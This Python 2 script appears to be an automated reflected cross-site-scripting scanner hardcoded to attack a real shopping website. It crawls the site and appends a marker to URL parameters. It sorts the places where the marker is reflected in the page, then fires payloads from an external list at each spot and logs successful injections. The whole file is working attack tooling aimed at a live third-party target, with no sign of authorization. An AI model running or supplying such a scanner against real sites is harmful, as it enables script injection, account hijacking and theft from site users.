# encoding: utf-8
from bs4 import BeautifulSoup
import urllib2
import bs4
import re
import json
import os
from url import loop_get
import urlparse

teststring = "A1D4C5"

re_str = re.compile(teststring)
payloads = json.load(open("".join([os.path.split(os.path.realpath(__file__))[0], "/xss_payloads.json"])))
ori_url = "http://www.jumei.com"
# to_test_ori = []
to_test = []
vul_url = []
test_urls = {
    "betweenTitle": [],
    "betweenTextarea": [],
    "betweenIframe": [],
    "betweenXmp": [],
    "betweenCommonTag": [],
    "betweenNoscript": [],
    "betweenNoframe": [],
    "betweenPlaintext": [],
    "betweenScript": [],
    "betweenStyle": [],
    "utf-7": [],
    "inMetaRefresh": [],
    "inCommonAttr": [],
    "inSrcHrefAction": [],
    "inScript": [],
    "inStyle": []
}


def get_vul_url(to_test_o, to_test_m, vul_urls):
    # 把url中的参数加上测试字符串
    try:
        for link in to_test_o:
            query = urllib2.urlparse.urlparse(link).query
            params = query.split("&")
            test_params = {}
            for i in params:
                if i == params[0]:
                    test_params["?" + i] = "?" + i + teststring
                else:
                    test_params["&" + i] = "&" + i + teststring
            for i in test_params:
                link = link.replace(i, test_params[i])
            # print link
            to_test_m.append(link)

        # 找出可能存在xss的url
        for link in to_test_m:
            try:
                response = urllib2.urlopen(link)
                code = response.getcode()
                if code == 200:
                    if teststring in response.read():
                        vul_urls.append(link)
            except urllib2.HTTPError, dig:
                print str(dig)
                continue
    except Exception, e:
        print str(e)
    # print vul_urls

# 遍历获取子标签, 用来检查标签属性中是否含有payload


def get_tag_children(tag, tag_lists):
    for i in tag.children:
        if type(i) == bs4.element.Tag:
            tag_lists.append(i)
            get_tag_children(i, tag_lists)

# 判断payload出现位置


def judge_location(url):
    try:
        tag_list = []
        re_key = re.compile(teststring)
        response = urllib2.urlopen(url)
        soup = BeautifulSoup(response, "html.parser", from_encoding="utf-8")
        get_tag_children(soup, tag_list)
        if soup.find_all(text=re_key):
            for i in soup.find_all(text=re_key):
                if i.find_parent("title"):
                    test_urls["betweenTitle"].append(url)
                elif i.find_parent("textarea"):
                    test_urls["betweenTextarea"].append(url)
                elif i.find_parent("xmp"):
                    test_urls["betweenXmp"].append(url)
                elif i.find_parent("iframe"):
                    test_urls["betweenIframe"].append(url)
                elif i.find_parent("noscript"):
                    test_urls["betweenNoscript"].append(url)
                elif i.find_parent("noframes"):
                    test_urls["betweenNoframe"].append(url)
                elif i.find_parent("plaintext"):
                    test_urls["betweenPlaintext"].append(url)
                elif i.find_parent("script"):
                    test_urls["betweenScript"].append(url)
                elif i.find_parent("style"):
                    test_urls["betweenStyle"].append(url)
                else:
                    test_urls["betweenCommonTag"].append(url)

        if soup.find_all(name="meta", attrs={"http-equiv": "Refresh", "content": re_key}):
            test_urls["inMetaRefresh"].append(url)

        if response.read().startswith(teststring):
            test_urls["utf-7"].append(url)

        for tag in tag_list:
            for attr in tag.attrs:
                if tag.attrs[attr]:
                    if teststring in tag.attrs[attr]:
                        test_urls["inCommonAttr"].append(url)
                        if attr in ["src", "href", "action"] and tag.attrs[attr].startswith(teststring):
                            test_urls["inSrcHrefAction"].append(url)
                        elif attr.startswith("on") or \
                                (attr in ["src", "href", "action"] and tag.attrs[attr].startswith("javascript")):
                            test_urls["inScript"].append(url)
                        elif attr == "style":
                            test_urls["inStyle"].append(url)
    except Exception, e:
        print str(e)


def result_record(log):
    outfile = open("results.txt", "a")
    outfile.write(log)
    outfile.close()


def confirm_in_script(soup, payload):
    tag_list = []
    get_tag_children(soup, tag_list)
    for tag in tag_list:
        for attr in tag:
            if attr.startswith("on") and payload in tag[attr]:
                return True
    return False


def test_single_payload(url, location, payload):
    modified_url = {}
    test_url = url.replace(teststring, "")
    test_url_stay = url.replace(teststring, "")
    print "[test]", test_url
    params = urlparse.urlparse(test_url).query.split("&")
    for i in params:
        if i == params[0]:
            modified_url[i] = i + payload
        else:
            modified_url[i] = i + payload
    for m in modified_url:
        temp = modified_url[m].split("=")
        if len(temp) == 2:
            test_url = test_url_stay.replace(m, temp[0]+"="+urllib2.quote(temp[1]))
        elif len(temp) == 3:
            test_url = test_url_stay.replace(m, temp[0]+"="+urllib2.quote("".join([temp[1], "=", temp[2]])))
        print "[modified]", test_url
        print location, payload
        response = urllib2.urlopen(test_url)
        response2 = urllib2.urlopen(test_url)
        text = response2.read()
        soup = BeautifulSoup(response, "html.parser", from_encoding="utf-8")
        if location == "inCommonAttr" and (soup.find_all("x55test") or soup.find_all(attrs={"x55test": re.compile("x55")})):
            print "!!!!!!!!", test_url
            result_record("[xss] [%s] [%s] %s" % (location, payload, test_url))
        if location in ("betweenCommonTag",
                        "betweenTitle",
                        "betweenTextarea",
                        "betweenPlaintext",
                        "betweenXmp",
                        "betweenNoscript",
                        "betweenNoframes",
                        "betweenIframe")and soup.find_all("x55test"):
            print test_url
            result_record("[xss] [%s] [%s] %s" % (location, payload, test_url))
        if location == "betweenScript" and (soup.find_all("x55test") or soup.find_all(name="script",
                                                                                      text=re.compile(r"[^\\]%s"
                                                                                                          % payload.replace
                                                                                          ("(", "\(").replace(")", "\)")))):
            result_record("[xss] [%s] [%s] %s" % (location, payload, test_url))
        if location == "betweenStyle" and (soup.find_all("x55test") or soup.find_all(name="style", text=re.compile("%s" % payload.replace(".", "\.").replace("(", "\(").replace("(", "\)")))):
            print test_url
            result_record("[xss] [%s] [%s] %s" % (location, payload, test_url))
        if location == "inMetaRefresh" and soup.find_all(name="meta", attrs={"http-equiv": "Refresh", "content": re.compile(payload)}):
            print test_url
            result_record("[xss] [%s] [%s] %s" % (location, payload, test_url))
        if location == "utf-7" and text.startswith("+/v8 +ADw-x55test+AD4-"):
            print test_url
            result_record("[xss] [%s] [%s] %s" % (location, payload, test_url))
        if location == "inSrcHrefAction" and (soup.find_all(attrs={"src": re.compile("^(%s)" % payload)})
                                              or soup.find_all(attrs={"href": re.compile("^(%s)" % payload)})
                                              or soup.find_all(attrs={"action": re.compile("^(%s)" % payload)})):
            print test_url
            result_record("[xss] [%s] [%s] %s" % (location, payload, test_url))
        if location == "inScript" and confirm_in_script(soup, payload):
            print test_url
            result_record("[xss] [%s] [%s] %s" % (location, payload, test_url))
        if location == "inStyle" and soup.find_all(attrs={"style":
                                                              re.compile("%s" % payload.replace(".", "\.").replace("(", "\(").replace(")", "\)"))}):
            print test_url
            result_record("[xss] [%s] [%s] %s" % (location, payload, test_url))


def test_xss():
    # 去重
    for i in test_urls:
        if test_urls[i]:
            test_urls[i] = list(set(test_urls[i]))
    # print test_urls
    for location in test_urls:
        for u in test_urls[location]:
            for p in payloads[location]:
                test_single_payload(u, location, p)

if __name__ == '__main__':
    to_test_ori = loop_get(ori_url, 5)
    get_vul_url(to_test_ori, to_test, vul_url)
    for i in vul_url:
        judge_location(i)
    test_xss()
